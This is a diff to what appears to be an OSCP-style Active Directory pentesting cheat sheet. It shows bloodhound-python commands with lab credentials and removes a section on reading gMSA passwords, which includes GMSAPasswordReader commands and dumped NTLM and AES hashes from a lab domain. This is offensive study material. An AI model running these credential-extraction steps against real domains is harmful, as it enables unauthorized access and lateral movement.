@@ -149,29 +149,6 @@ This will extract all json files if you have credential but no shell
 bloodhound-python -ns 192.168.219.21 -d nagoya-industries.com -u 'Fiona.Clark' -p 'Summer2023' -c all
 sudo proxychains4 -f /etc/proxychains4.conf bloodhound-python -ns 10.10.179.140 -d oscp.exam -u 'web_svc' -p 'Diamond1' -c all --dns-tcp
 ```
-### Abusing Read GMSAP Password
-```
-Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
-Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
-.\GMSAPasswordReader.exe --accountname=SVC_APACHE
-
-[*] Input username             : svc_apache$
-[*] Input domain               : HEIST.OFFSEC
-[*] Salt                       : HEIST.OFFSECsvc_apache$
-[*]       rc4_hmac             : 83AC7FECFBF44780E3AAF5D04DD368A5
-[*]       aes128_cts_hmac_sha1 : 08E643C43F775FAC782EDBB04DD40541
-[*]       aes256_cts_hmac_sha1 : 588C2BB865E771ECAADCB48ECCF4BCBCD421BF329B0133A213C83086F1A2E3D7
-[*]       des_cbc_md5          : 9E340723700454E9
-
-Calculating hashes for Current Value
-[*] Input username             : svc_apache$
-[*] Input domain               : HEIST.OFFSEC
-[*] Salt                       : HEIST.OFFSECsvc_apache$
-[*]       rc4_hmac             : 0AFF0D9DFA8B436E6688697B0A47B50C (NTLM Hash)
-[*]       aes128_cts_hmac_sha1 : C958BEE96DEE78F9035F460B91EC6D86
-[*]       aes256_cts_hmac_sha1 : D3C18DAF21128CAFEAECE5BFF6599A0A4DFB2E9BE22F6CFE13677688B0A34988
-[*]       des_cbc_md5          : 0804169DCECB6102
-```
 ### Abusing ReadLaps Password
 >LAPS allows you to manage the local Administrator password (which is randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. 
 ```
